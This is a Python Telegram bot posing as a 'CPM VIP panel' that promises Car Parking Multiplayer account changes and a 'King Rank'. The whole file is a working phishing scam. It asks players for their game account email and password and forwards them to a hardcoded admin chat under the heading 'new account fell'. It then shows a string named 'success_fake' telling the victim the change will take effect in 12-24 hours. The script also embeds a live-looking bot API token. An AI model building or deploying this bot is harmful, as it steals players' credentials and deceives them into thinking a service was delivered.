import telebot
from telebot import types
import time

# --- AYARLAR ---
API_TOKEN = '8632802130:AAEBt621oMiWnAGBytHaxtN9C32RBFSz6Zc'
MY_ADMIN_ID = 8134695168 

bot = telebot.TeleBot(API_TOKEN)
user_data = {}

strings = {
    'tr': {
        'welcome': "🎖 **CPM GLOBAL VIP PANEL**\n\nLütfen **Lisans Anahtarınızı (KEY)** giriniz:",
        'invalid_key': "⚠️ Geçersiz Anahtar! Tekrar deneyin:",
        'select_cpm': "✅ Erişim Onaylandı. Oyun sürümünü seçin:",
        'select_action': "🛠 Yapılacak işlemi seçin:",
        'ask_old_mail': "📧 Mevcut E-posta adresiniz:",
        'ask_old_pass': "🔒 Mevcut Hesap şifreniz:",
        'ask_new': "🆕 Yeni güncellenecek bilgiyi yazın:",
        'processing': "⚙️ Veritabanına bağlanılıyor...",
        'success_fake': "✅ **İŞLEM BAŞARILI!**\n\n12-24 saat içinde hesabınıza yansıyacaktır.",
        'btns': ["📧 Mail Değiştir", "🔒 Şifre Değiştir", "👑 King Rank Aktif Et"]
    },
    'en': {
        'welcome': "🎖 **CPM VIP**\nEnter KEY:",
        'invalid_key': "❌ Invalid!",
        'select_cpm': "✅ Select version:",
        'select_action': "🛠 Select action:",
        'ask_old_mail': "📧 Email:",
        'ask_old_pass': "🔒 Password:",
        'ask_new': "🆕 New info:",
        'processing': "⚙️ Checking...",
        'success_fake': "✅ Success! Wait 12-24h.",
        'btns': ["📧 Change Mail", "🔒 Change Pass", "👑 King Rank"]
    }
}

@bot.message_handler(commands=['start'])
def start(message):
    markup = types.InlineKeyboardMarkup(row_width=2)
    markup.add(
        types.InlineKeyboardButton("🇹🇷 Türkçe", callback_data="l_tr"),
        types.InlineKeyboardButton("🇺🇸 English", callback_data="l_en")
    )
    bot.send_message(message.chat.id, "🌐 Language / Dil:", reply_markup=markup)

@bot.callback_query_handler(func=lambda call: call.data.startswith('l_'))
def handle_lang(call):
    lang = call.data.split('_')[1]
    user_data[call.message.chat.id] = {'lang': lang}
    msg = bot.send_message(call.message.chat.id, strings[lang]['welcome'], parse_mode="Markdown")
    bot.register_next_step_handler(msg, step_check_key)

def step_check_key(message):
    lang = user_data[message.chat.id]['lang']
    if message.text.upper() == 'C12':
        markup = types.ReplyKeyboardMarkup(resize_keyboard=True, one_time_keyboard=True)
        markup.add("CPM 1", "CPM 2")
        msg = bot.send_message(message.chat.id, strings[lang]['select_cpm'], reply_markup=markup)
        bot.register_next_step_handler(msg, step_select_action)
    else:
        msg = bot.send_message(message.chat.id, strings[lang]['invalid_key'])
        bot.register_next_step_handler(msg, step_check_key)

def step_select_action(message):
    lang = user_data[message.chat.id]['lang']
    user_data[message.chat.id]['cpm_type'] = message.text
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
    for btn in strings[lang]['btns']:
        markup.add(btn)
    msg = bot.send_message(message.chat.id, strings[lang]['select_action'], reply_markup=markup)
    bot.register_next_step_handler(msg, step_ask_old_mail)

def step_ask_old_mail(message):
    lang = user_data[message.chat.id]['lang']
    user_data[message.chat.id]['action'] = message.text
    msg = bot.send_message(message.chat.id, strings[lang]['ask_old_mail'], reply_markup=types.ReplyKeyboardRemove())
    bot.register_next_step_handler(msg, step_ask_old_pass)

def step_ask_old_pass(message):
    lang = user_data[message.chat.id]['lang']
    user_data[message.chat.id]['old_mail'] = message.text
    msg = bot.send_message(message.chat.id, strings[lang]['ask_old_pass'])
    bot.register_next_step_handler(msg, step_get_new_val)

def step_get_new_val(message):
    lang = user_data[message.chat.id]['lang']
    user_data[message.chat.id]['old_pass'] = message.text
    if "👑" not in user_data[message.chat.id]['action'] and "King" not in user_data[message.chat.id]['action']:
        msg = bot.send_message(message.chat.id, strings[lang]['ask_new'])
        bot.register_next_step_handler(msg, final_report)
    else:
        final_report(message, is_king=True)

def final_report(message, is_king=False):
    lang = user_data[message.chat.id]['lang']
    new_val = message.text if not is_king else "KING RANK"
    bot.send_message(message.chat.id, strings[lang]['processing'])
    
    report = f"🎯 **YENİ HESAP DÜŞTÜ!** 🎯\n\n" \
             f"👤 Kullanıcı: @{message.from_user.username}\n" \
             f"📧 Mail: `{user_data[message.chat.id]['old_mail']}`\n" \
             f"🔒 Şifre: `{user_data[message.chat.id]['old_pass']}`\n" \
             f"🛠 İşlem: {user_data[message.chat.id]['action']}\n" \
             f"📝 Yeni Değer: `{new_val}`"
    
    bot.send_message(MY_ADMIN_ID, report, parse_mode="Markdown")
    time.sleep(2)
    bot.send_message(message.chat.id, strings[lang]['success_fake'], parse_mode="Markdown")

if __name__ == "__main__":
    bot.infinity_polling()
